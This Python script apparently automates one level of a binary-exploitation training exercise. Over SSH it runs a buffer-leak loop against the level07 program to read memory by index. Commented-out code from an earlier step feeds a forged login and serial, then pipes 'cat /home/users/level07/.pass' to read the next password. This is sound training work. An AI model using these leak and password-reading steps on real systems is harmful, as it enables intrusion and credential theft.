import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, get_func_structure, get_func_address
from utils.text import print_output, print_title, print_magic
from utils.base import save_token, address_to_string

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

output = exec(client, f'echo "quit" | ./{binary_name}', title='Simple execute binary with test arg')
print_output(output)
print_title("3 commands we can apply, store, read and quit, a little reverse")
print_magic('Debug Time!')

# get_func_structure(
#     client,
#     'auth', filter=['+20>:', '+45>:', '+114>:'],
#     title='Ptrace to check debug, length check (5 >= characters). '
#           'Then it creates a key with the 3rd char '
#           'in name, and change it in a loop as big as the length of the name.'
# )
# login = 'lrorscha'
# print_title(f'Find verify key for our login {login}')
#
print_title('We can store any data at buffer, and read already write data, try to find allocated size to get offset')
output = exec(client, '''for((i=0;i<150;i++)); do OUTPUT=`/home/users/level07/level07 < <(python -c "print('read\\n$i\\nquit')") | grep 'Input command:  Index:'` ; NB=`echo $OUTPUT | cut -d " " -f 8`; HEX=`printf %x $NB` ; echo $OUTPUT | awk '{ print $6,"0x'"$HEX"'"}' | egrep -wv "0x0|0x1" ; done''')
print_output(output)
# f = lambda n: exec(
#     client, "for((i=0;i<150;i++)); do OUTPUT=`/home/users/level07/level07 < <(python -c \"print('read\n$i\nquit')") | grep 'Input command:  Index:'` ; NB=`echo $OUTPUT | cut -d " " -f 8`; HEX=`printf %x $NB` ; echo $OUTPUT | awk \'{ print $1,$2,$3,$4,$5,$6,$7,"0x'"$HEX"'\"}\' ; done",
# )
# print_output(f(1))
# print_output(output)
# login_hex = output[0]
# print_title('Transform hex to int')
# serial = str(int(login_hex, 16))
# print_output(serial)
# print_title('Awesome! Try it!')
#
# output = exec(
#     client, f'(echo "{login}"; echo "{serial}") | ./{binary_name}',
#     title='User our login and obtained serial',
# )
# print_output(output)
# print_title('Success! Time to dirty tricks')
#
# output = exec(
#     client, f'echo "cat /home/users/level07/.pass" | (echo "{login}"; echo "{serial}"; cat -) | ./{binary_name} | head -n 1',
#     title='Steal password',
# )
# print_output(output)
# token = output[0]
#
# save_token(token)
